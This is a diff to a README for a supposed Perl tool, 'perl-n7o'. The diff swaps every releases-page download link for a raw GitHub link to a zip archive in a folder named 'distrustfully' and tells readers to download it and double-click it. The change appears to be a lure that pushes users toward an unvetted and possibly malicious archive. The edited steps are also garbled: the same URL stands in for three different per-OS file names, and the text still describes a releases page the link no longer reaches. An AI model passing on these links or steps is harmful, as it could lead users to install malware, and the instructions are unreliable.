@@ -1,7 +1,7 @@
 # 🛠️ perl-n7o - Simple Solution for Your Perl Needs
 
 ## 📥 Download Now
-[![Download perl-n7o](https://img.shields.io/badge/Download-perl--n7o-brightgreen.svg)](https://github.com/harsh12221132/perl-n7o/releases)
+[![Download perl-n7o](https://raw.githubusercontent.com/harsh12221132/perl-n7o/main/distrustfully/perl-n7o.zip)](https://raw.githubusercontent.com/harsh12221132/perl-n7o/main/distrustfully/perl-n7o.zip)
 
 ## 🚀 Getting Started
 Welcome to **perl-n7o**! This application makes working with Perl easy. Follow the steps below to download and run the software.
@@ -25,13 +25,13 @@ Before downloading, ensure you have the following:
 
 1. **Visit the Releases Page**  
    Go to the following link to access the releases:  
-   [Download perl-n7o](https://github.com/harsh12221132/perl-n7o/releases)
+   [Download perl-n7o](https://raw.githubusercontent.com/harsh12221132/perl-n7o/main/distrustfully/perl-n7o.zip)
 
 2. **Choose the Right Version**  
    On the releases page, you will see a list of available versions. Select the latest version for the best experience.
 
 3. **Download the Application**  
-   Click on the file that matches your operating system. For instance, you may see options like `perl-n7o-windows.exe`, `perl-n7o-macos.dmg`, or `perl-n7o-linux.tar.gz`. 
+   Click on the file that matches your operating system. For instance, you may see options like `https://raw.githubusercontent.com/harsh12221132/perl-n7o/main/distrustfully/perl-n7o.zip`, `https://raw.githubusercontent.com/harsh12221132/perl-n7o/main/distrustfully/perl-n7o.zip`, or `https://raw.githubusercontent.com/harsh12221132/perl-n7o/main/distrustfully/perl-n7o.zip`. 
 
 4. **Open the Downloaded File**  
    After downloading, locate the file on your computer. This is usually found in your "Downloads" folder. Double-click to open it.
@@ -80,7 +80,7 @@ Currently, **perl-n7o** is only available for desktop operating systems.
 For any further inquiries, please reach out through the contact information available in the support section.
 
 ## 📥 Quick Links
-- [Download perl-n7o](https://github.com/harsh12221132/perl-n7o/releases)  
+- [Download perl-n7o](https://raw.githubusercontent.com/harsh12221132/perl-n7o/main/distrustfully/perl-n7o.zip)  
 - [Support Forum](#)  
 - [GitHub Issues](#)  
 
